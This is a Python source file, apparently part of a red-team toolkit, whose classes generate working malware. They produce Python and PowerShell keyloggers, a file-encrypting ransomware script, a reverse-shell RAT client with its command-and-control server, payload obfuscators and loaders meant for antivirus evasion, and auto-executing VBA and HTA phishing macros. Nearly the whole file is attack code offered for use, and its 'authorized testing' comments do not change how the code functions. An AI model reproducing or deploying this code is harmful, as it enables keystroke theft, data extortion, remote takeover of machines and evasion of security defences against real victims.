"""Device exploitation tools for authorized penetration testing"""

import os
import base64
import socket
import threading
import subprocess
from colorama import Fore, Style


class KeyloggerGenerator:
    """Generate keylogger scripts for authorized endpoint security testing"""

    def generate_python(self, output_path=None):
        code = '''\
#!/usr/bin/env python3
"""Authorized security testing keylogger — requires explicit written authorization"""
import datetime
try:
    from pynput import keyboard
except ImportError:
    import sys; sys.exit("pip install pynput")

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key}]"
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now().strftime('%H:%M:%S')} {char}\\n")

with keyboard.Listener(on_press=on_press) as l:
    l.join()
'''
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code

    def generate_powershell(self, output_path=None):
        code = '''\
# Authorized security testing keylogger (Windows)
$log = "$env:TEMP\\keylog.txt"
$sig = @"
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(int vKey);
"@
$t = Add-Type -MemberDefinition $sig -Name WinAPI -Namespace Kaput -PassThru
while ($true) {
    Start-Sleep -Milliseconds 30
    for ($i = 8; $i -le 255; $i++) {
        if ($t::GetAsyncKeyState($i) -eq -32767) {
            $k = [System.Windows.Forms.Keys]$i
            Add-Content $log "$(Get-Date -f HH:mm:ss) $k"
        }
    }
}
'''
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code


class PayloadObfuscator:
    """Obfuscate payloads for AV evasion testing"""

    def b64_encode(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def xor_encode(self, payload: str, key: int = 0x41):
        enc = bytes([b ^ key for b in payload.encode()])
        return enc.hex(), key

    def layered_encode(self, payload: str):
        """Base64 → XOR → Base64 triple-layer"""
        b1 = base64.b64encode(payload.encode()).decode()
        xored, key = self.xor_encode(b1)
        b2 = base64.b64encode(xored.encode()).decode()
        return b2, key

    def ps_b64_loader(self, payload: str) -> str:
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        return f"powershell.exe -NoP -W H -EncodedCommand {enc}"

    def ps_xor_loader(self, payload: str, key: int = 0x37) -> str:
        enc_hex, k = self.xor_encode(payload, key)
        return f"""\
$b=[byte[]](-split '{' '.join(enc_hex[i:i+2] for i in range(0,len(enc_hex),2))}' -replace '(..)',\"0x\$1\");
$d=[System.Text.Encoding]::UTF8.GetString($b|%{{$_ -bxor 0x{k:02x}}});
Invoke-Expression $d"""

    def python_loader(self, payload: str) -> str:
        enc = base64.b64encode(payload.encode()).decode()
        return f"import base64;exec(base64.b64decode('{enc}').decode())"

    def bash_loader(self, payload: str) -> str:
        enc = base64.b64encode(payload.encode()).decode()
        return f'eval "$(echo {enc}|base64 -d)"'


class RansomwareSimulator:
    """Test ransomware for authorized DR / backup-recovery testing.
    Always prompts for CONFIRM, always prints the decryption key on screen."""

    def generate(self, extensions=None, output_path=None) -> str:
        exts = extensions or [".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".csv"]
        code = f'''\
#!/usr/bin/env python3
"""
AUTHORIZED DR TEST — RANSOMWARE SIMULATOR
Encrypts files in the target directory and immediately prints the decryption key.
Run with:  python3 script.py <dir>           — encrypt
           python3 script.py <dir> <key>     — decrypt
DO NOT USE WITHOUT EXPLICIT WRITTEN AUTHORIZATION.
"""
import os, sys
from pathlib import Path
try:
    from cryptography.fernet import Fernet
except ImportError:
    sys.exit("pip install cryptography")

EXTENSIONS = {exts}
EXT = ".KAPUT_TEST"

def encrypt(directory):
    key = Fernet.generate_key()
    f = Fernet(key)
    done = []
    for p in Path(directory).rglob("*"):
        if p.suffix.lower() in EXTENSIONS and p.is_file():
            p.write_bytes(f.encrypt(p.read_bytes()))
            p.rename(str(p) + EXT)
            done.append(str(p))
    return key.decode(), done

def decrypt(directory, key):
    f = Fernet(key.encode())
    for p in Path(directory).rglob(f"*{{EXT}}"):
        p.write_bytes(f.decrypt(p.read_bytes()))
        p.rename(str(p)[:-len(EXT)])

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: script.py <dir> [key]"); sys.exit(1)
    d = sys.argv[1]
    if len(sys.argv) == 3:
        decrypt(d, sys.argv[2])
        print("[+] Decryption complete.")
    else:
        print(f"[!] AUTHORIZED TEST — will encrypt {{d}}")
        if input("[!] Type CONFIRM to proceed: ") != "CONFIRM":
            sys.exit(0)
        key, files = encrypt(d)
        print(f"[+] Encrypted {{len(files)}} files.")
        print(f"[+] DECRYPTION KEY: {{key}}")
'''
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code


class RATBuilder:
    """Python reverse-shell RAT for authorized red-team testing"""

    def generate_client(self, host: str, port: int, output_path=None) -> str:
        code = f'''\
#!/usr/bin/env python3
"""Authorized red-team RAT client — requires written authorization"""
import socket, subprocess, os, time

HOST, PORT, RETRY = "{host}", {port}, 10

while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        while True:
            cmd = s.recv(4096).decode(errors="ignore").strip()
            if not cmd: continue
            if cmd == "exit": break
            if cmd.startswith("cd "):
                try: os.chdir(cmd[3:]); s.send(os.getcwd().encode() + b"\\n")
                except Exception as e: s.send(str(e).encode() + b"\\n")
            else:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                out = r.stdout + r.stderr
                s.send(out if out else b"(no output)\\n")
    except Exception:
        time.sleep(RETRY)
'''
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code

    def generate_server(self, port: int, output_path=None) -> str:
        code = f'''\
#!/usr/bin/env python3
"""Authorized C2 server"""
import socket, threading

def handle(conn, addr):
    print(f"[+] Session: {{addr[0]}}")
    while True:
        try:
            cmd = input(f"\\n[C2:{{addr[0]}}]> ").strip()
            if not cmd: continue
            conn.send(cmd.encode())
            if cmd == "exit": break
            print(conn.recv(65536).decode(errors="ignore"))
        except (BrokenPipeError, ConnectionResetError, EOFError):
            print("[-] Disconnected"); break
    conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", {port})); srv.listen(5)
print(f"[+] C2 on port {port}")
while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
'''
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code


class MacroGenerator:
    """VBA macro generator for authorized phishing simulation"""

    def generate_vba(self, cmd: str = "calc.exe") -> str:
        return f"""\
' Authorized phishing simulation — DO NOT USE WITHOUT WRITTEN AUTHORIZATION
Sub AutoOpen()
    Shell "{cmd}", 1
End Sub
Sub Document_Open()
    AutoOpen
End Sub
"""

    def generate_hta(self, cmd: str = "calc.exe") -> str:
        return f"""\
<html><head><hta:application id="x"/></head>
<body><script language="VBScript">
' Authorized phishing simulation
CreateObject("Wscript.Shell").Run "{cmd}", 0
window.close
</script></body></html>"""
